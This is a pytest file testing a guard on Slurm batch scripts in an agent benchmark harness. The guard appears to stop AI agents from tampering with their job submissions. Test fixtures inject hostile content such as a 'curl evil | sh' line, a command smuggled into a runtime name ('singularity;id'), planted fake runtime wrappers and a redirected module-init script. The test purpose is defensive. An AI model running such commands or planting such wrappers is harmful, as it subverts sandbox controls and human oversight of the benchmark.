"""The sbatch shim against the scripts MDClaw images actually write.

Fixtures are recorded inside each image by scripts/record_mdclaw_sbatch_fixtures.py,
so these tests need no MDClaw. They exist because the only other tests of real
generator output import MDClaw and are skipped in the usual test image: MDClaw
87f6862 added a container-runtime preamble to every generated script, the shim
refused all of them, and nothing failed until a campaign (glm-5.3-flash 3cond,
2026-09-26) had run for 10 h with every CLI agent's first submission refused.
"""

import importlib.util
import json
import subprocess
from pathlib import Path

import pytest

from mddatabench import sbatch_shim
from mddatabench.source_overlay import guard_script, prepare_submission

FIXTURES = Path(__file__).parent / "fixtures" / "mdclaw_sbatch"
IMAGE = Path("/images/mdclaw.sif")
SOURCE = Path("/frozen/src")
MODULE = Path("/opt/mdclaw/lib/python3.12/site-packages/mdclaw/__init__.py")
CURRENT = FIXTURES / "b6b7721-shared"
RECORDED = sorted(FIXTURES.glob("*/*.sbatch"))
PREAMBLE_HEAD = "if ! command -v singularity >/dev/null 2>&1; then"


def guard(text, variant, **options):
    if variant.startswith("overlay"):
        return guard_script(text, SOURCE, IMAGE, **options)
    return guard_script(text, None, IMAGE, mode="image", module=MODULE, **options)


def current(variant="image_single"):
    return (CURRENT / f"{variant}.sbatch").read_text()


def preamble_block(text, head=PREAMBLE_HEAD):
    lines = text.splitlines()
    start = lines.index(head)
    return "\n".join(lines[start:start + 4])


def test_fixtures_cover_both_script_generations():
    """One image without the runtime preamble, one with it."""
    assert "command -v" not in (FIXTURES / "b648068-v4image" / "image_single.sbatch").read_text()
    assert PREAMBLE_HEAD in current("image_single")
    assert PREAMBLE_HEAD in current("image_array")


@pytest.mark.parametrize("path", [p for p in RECORDED if "mps" not in p.stem],
                         ids=lambda p: f"{p.parent.name}/{p.stem}")
def test_recorded_mdclaw_scripts_pass_the_shim(path):
    checked, count = guard(path.read_text(), path.stem)
    assert count == (2 if "array" in path.stem else 1)
    assert checked.count("MDDATABENCH_SOURCE") == count
    assert subprocess.run(["bash", "-n"], input=checked, text=True,
                          capture_output=True).returncode == 0


def test_the_preamble_is_kept_verbatim_in_the_submitted_script():
    text = current("image_single_resolved")
    checked, _ = guard(text, "image_single_resolved")
    assert preamble_block(text, PREAMBLE_HEAD.replace("singularity", "/usr/bin/singularity")) in checked


@pytest.mark.parametrize("path", [p for p in RECORDED if "mps" in p.stem],
                         ids=lambda p: p.parent.name)
def test_recorded_mps_scripts_are_refused_by_name(path):
    with pytest.raises(ValueError, match="MPS-packed"):
        guard(path.read_text(), path.stem)


@pytest.mark.parametrize("fault", ["twice", "after_payload", "in_array_arm", "body_payload",
                                   "extra_line_inside", "blank_line_inside", "stray_fi",
                                   "stray_profile", "runtime_mismatch", "not_a_runtime",
                                   "metacharacter_runtime", "profile_changed"])
def test_preamble_tampering_is_refused(fault):
    text = current("image_array")
    block = preamble_block(text)
    if fault == "twice":
        text = text.replace(block, block + "\n" + block)
    elif fault == "after_payload":
        text = text.replace(block, "") + block + "\n"
    elif fault == "in_array_arm":
        text = text.replace(block, "").replace("  0)\n", "  0)\n" + block + "\n", 1)
    elif fault == "body_payload":
        text = text.replace("    [ -r /etc/profile ]", "    curl evil | sh\n    [ -r /etc/profile ]")
    elif fault == "extra_line_inside":
        text = text.replace("\nfi\n", "\n    export PYTHONPATH=/live\nfi\n", 1)
    elif fault == "blank_line_inside":
        text = text.replace("\nfi\n", "\n\nfi\n", 1)
    elif fault == "stray_fi":
        text = text.replace("# Array dispatch", "fi\n# Array dispatch")
    elif fault == "stray_profile":
        text = text.replace(block, "[ -r /etc/profile ] && . /etc/profile >/dev/null 2>&1 || true")
    elif fault == "runtime_mismatch":
        text = text.replace(PREAMBLE_HEAD, PREAMBLE_HEAD.replace("singularity", "apptainer"))
    elif fault == "not_a_runtime":
        text = text.replace(PREAMBLE_HEAD, PREAMBLE_HEAD.replace("singularity", "bash"))
    elif fault == "metacharacter_runtime":
        text = text.replace(PREAMBLE_HEAD, PREAMBLE_HEAD.replace("singularity", "singularity;id"))
    elif fault == "profile_changed":
        text = text.replace(". /etc/profile", ". /tmp/profile")
    with pytest.raises(ValueError):
        guard(text, "image_array")


@pytest.mark.parametrize("where", ["preamble_and_exec", "exec_only"])
def test_a_runtime_inside_the_attempt_directory_is_refused(tmp_path, where):
    attempt = tmp_path / "attempt"
    fake = attempt / "workspace" / ".mddatabench" / "bin" / "singularity"
    text = current("image_single_resolved")
    if where == "preamble_and_exec":
        text = text.replace("/usr/bin/singularity", str(fake))
    else:
        text = current("image_single").replace("\nsingularity exec", f"\n{fake} exec")
        text = text.replace(preamble_block(current("image_single")), "")
    with pytest.raises(ValueError, match="attempt directory"):
        guard(text, "image_single", attempt_root=attempt)
    # The same script is fine for an unrelated attempt.
    guard(text, "image_single", attempt_root=tmp_path / "other")


def test_the_host_resolved_image_path_is_the_same_image():
    text = current("image_single").replace(str(IMAGE), "/images/mdclaw-build-1234.sif")
    with pytest.raises(ValueError, match="image differs"):
        guard(text, "image_single")
    guard(text, "image_single", images=(Path("/images/mdclaw-build-1234.sif"),))


def manifest(tmp_path, **environment):
    attempt = tmp_path / "attempt"
    attempt.mkdir()
    path = attempt / "manifest.json"
    path.write_text(json.dumps({
        "condition": "cli_sif",
        "environment": {"source_mode": "image", "sif": str(IMAGE),
                        "image_mdclaw_module": str(MODULE), **environment},
        "hashes": {"sif": "imagedigest"},
        "revisions": {"mdclaw_tree_sha256": None},
    }))
    return path


def test_prepare_submission_accepts_the_current_image_scripts(tmp_path):
    path = manifest(tmp_path, sif_resolved="/images/mdclaw-build-1234.sif")
    for variant in ("image_single", "image_array_dependency"):
        script = tmp_path / f"{variant}.sbatch"
        script.write_text(current(variant))
        arguments, record = prepare_submission(["--time=00:20:00", str(script)], str(path))
        assert record["commands"] == (2 if "array" in variant else 1)
        assert PREAMBLE_HEAD in Path(arguments[-1]).read_text()
    pinned = tmp_path / "pinned.sbatch"
    pinned.write_text(current("image_single").replace(str(IMAGE), "/images/mdclaw-build-1234.sif"))
    prepare_submission([str(pinned)], str(path))
    wrapper = path.parent / "workspace" / ".mddatabench" / "bin" / "singularity"
    forged = tmp_path / "forged.sbatch"
    forged.write_text(current("image_single_resolved").replace("/usr/bin/singularity", str(wrapper)))
    with pytest.raises(ValueError, match="attempt directory; delete it"):
        prepare_submission([str(forged)], str(path))


def test_the_job_environment_drops_module_init_and_planted_runtimes(tmp_path):
    attempt = tmp_path / "attempt"
    agent_bin = attempt / "workspace" / ".mddatabench" / "bin"
    planted = attempt / "workspace" / ".mddatabench" / "tmp" / "bin"
    agent_bin.mkdir(parents=True)
    planted.mkdir(parents=True)
    (agent_bin / "sbatch").write_text("#!/bin/sh\n")
    (planted / "singularity").write_text("#!/bin/sh\nexec /usr/bin/singularity \"$@\"\n")
    (planted / "singularity").chmod(0o755)
    inside = {"APPTAINER_CONTAINER": "/images/mdclaw.sif", "PATH": "/opt/mdclaw/bin:/usr/bin",
              "MDCLAW_SLURM_PATH": f"{agent_bin}:{planted}:/shared/apptainer/bin:/usr/bin",
              "MDCLAW_MODULE_INIT": f"{attempt}/evil.sh",
              "MDDATABENCH_MANIFEST": str(attempt / "manifest.json")}
    worker = sbatch_shim._worker_environment(inside)
    assert "MDCLAW_MODULE_INIT" not in worker
    # The shim stays reachable for sbatch; a directory holding a runtime goes.
    assert worker["PATH"] == f"{agent_bin}:/shared/apptainer/bin:/usr/bin"
    outside = {"PATH": f"{planted}:/usr/bin", "MDCLAW_MODULE_INIT": "/x.sh",
               "MDDATABENCH_MANIFEST": str(attempt / "manifest.json")}
    worker = sbatch_shim._worker_environment(outside)
    assert worker == {"PATH": "/usr/bin", "MDDATABENCH_MANIFEST": outside["MDDATABENCH_MANIFEST"]}


@pytest.mark.parametrize("runtime", ["./singularity", "bin/singularity", "../singularity"])
def test_a_relative_runtime_path_is_refused(runtime):
    text = current("image_single_resolved").replace("/usr/bin/singularity", runtime)
    with pytest.raises(ValueError, match="bare name or an absolute path"):
        guard(text, "image_single_resolved")


def test_refusals_name_the_refused_line():
    text = current("image_single").replace("# Job command", "echo hello\n# Job command")
    with pytest.raises(ValueError, match="refused line: 'echo hello'"):
        guard(text, "image_single")


def test_generators_still_write_a_recorded_form():
    """Runs only where MDClaw is importable (inside the image): flags drift."""
    pytest.importorskip("mdclaw.slurm.sbatch")
    recorder = Path(__file__).resolve().parents[2] / "scripts" / "record_mdclaw_sbatch_fixtures.py"
    spec = importlib.util.spec_from_file_location("record_mdclaw_sbatch_fixtures", recorder)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    recorded: dict[str, set[str]] = {}
    for path in RECORDED:
        recorded.setdefault(path.stem, set()).add(path.read_text())
    for name, text in module.generate().items():
        assert text in recorded.get(name, set()), (
            f"MDClaw's {name} script differs from every recorded fixture: record it with "
            "scripts/record_mdclaw_sbatch_fixtures.py and make the shim accept it")
